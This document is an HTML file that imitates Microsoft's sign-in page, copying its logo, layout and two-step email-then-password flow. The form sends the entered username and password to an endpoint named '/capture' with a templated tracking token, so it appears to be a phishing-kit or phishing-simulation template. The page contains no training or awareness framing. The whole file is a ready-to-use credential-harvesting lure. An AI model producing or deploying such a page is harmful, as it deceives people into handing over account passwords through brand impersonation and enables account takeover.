<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Microsoft</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: "Segoe UI", system-ui, -apple-system, sans-serif;
      background: #f2f2f2;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
    }

    .container {
      background: #fff;
      padding: 44px;
      width: 100%;
      max-width: 440px;
      box-shadow: 0 2px 6px rgba(0,0,0,.12);
    }

    .logo {
      margin-bottom: 16px;
      line-height: 0;
    }

    .logo svg {
      display: block;
      width: 108px;
      height: 24px;
    }

    h1 {
      font-size: 24px;
      font-weight: 600;
      color: #1b1b1b;
      margin-bottom: 12px;
    }

    .subtitle {
      font-size: 15px;
      color: #1b1b1b;
      margin-bottom: 24px;
    }

    .form-group {
      margin-bottom: 20px;
    }

    label {
      display: block;
      font-size: 13px;
      font-weight: 600;
      color: #1b1b1b;
      margin-bottom: 4px;
    }

    input[type="email"],
    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 6px 0;
      font-size: 15px;
      border: none;
      border-bottom: 1px solid #666;
      outline: none;
      background: transparent;
      color: #1b1b1b;
      transition: border-color 0.15s;
    }

    input:focus {
      border-bottom: 2px solid #0067b8;
    }

    .btn-next,
    .btn-signin {
      display: block;
      width: 100%;
      padding: 8px 16px;
      background: #0067b8;
      color: #fff;
      font-size: 15px;
      font-weight: 600;
      border: none;
      cursor: pointer;
      margin-top: 24px;
      text-align: center;
      transition: background 0.15s;
    }

    .btn-next:hover,
    .btn-signin:hover {
      background: #005a9e;
    }

    .options {
      margin-top: 16px;
      font-size: 13px;
    }

    .options a {
      color: #0067b8;
      text-decoration: none;
    }

    .options a:hover {
      text-decoration: underline;
    }

    .divider {
      border: none;
      border-top: 1px solid #e6e6e6;
      margin: 24px 0;
    }

    .create-account {
      font-size: 13px;
      color: #1b1b1b;
    }

    .create-account a {
      color: #0067b8;
      text-decoration: none;
    }

    .footer {
      margin-top: 32px;
      font-size: 12px;
      color: #666;
      display: flex;
      gap: 16px;
      flex-wrap: wrap;
    }

    .footer a {
      color: #666;
      text-decoration: none;
    }

    .footer a:hover {
      text-decoration: underline;
    }

    #password-section {
      display: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 108 24" role="img" aria-label="Microsoft">
        <rect width="11" height="11" fill="#F25022"/>
        <rect x="12" width="11" height="11" fill="#7FBA00"/>
        <rect y="12" width="11" height="11" fill="#00A4EF"/>
        <rect x="12" y="12" width="11" height="11" fill="#FFB900"/>
        <text x="28" y="17"
              font-family="Segoe UI, Segoe UI Web, system-ui, -apple-system, sans-serif"
              font-size="15.5"
              font-weight="600"
              fill="#5E5E5E">Microsoft</text>
      </svg>
    </div>

    <h1>Sign in</h1>
    <p class="subtitle">to continue to Microsoft</p>

    <form id="login-form" method="POST" action="/capture">
      <input type="hidden" name="track_token" value="{{ track_token }}" />

      <div id="email-section">
        <div class="form-group">
          <label for="email">Email, phone, or Skype</label>
          <input type="text" id="email" name="username" autocomplete="username" autofocus required />
        </div>
        <div class="options">
          <a href="#">No account? Create one!</a>
        </div>
        <div class="options" style="margin-top:8px">
          <a href="#">Can't access your account?</a>
        </div>
        <button type="button" class="btn-next" onclick="showPassword()">Next</button>
      </div>

      <div id="password-section">
        <div class="form-group">
          <label for="password">Password</label>
          <input type="password" id="password" name="password" autocomplete="current-password" required />
        </div>
        <div class="options">
          <a href="#">Forgot password?</a>
        </div>
        <button type="submit" class="btn-signin">Sign in</button>
      </div>
    </form>

    <hr class="divider" />

    <div class="create-account">
      <a href="#">Sign-in options</a>
    </div>

    <div class="footer">
      <a href="#">Terms of use</a>
      <a href="#">Privacy &amp; cookies</a>
      <a href="#">...</a>
    </div>
  </div>

  <script>
    function showPassword() {
      const emailInput = document.getElementById("email");
      const emailVal = emailInput.value.trim();
      if (!emailVal) {
        emailInput.focus();
        return;
      }
      emailInput.removeAttribute("required");
      document.getElementById("email-section").style.display = "none";
      document.getElementById("password-section").style.display = "block";
      document.getElementById("password").focus();
    }
  </script>
</body>
</html>
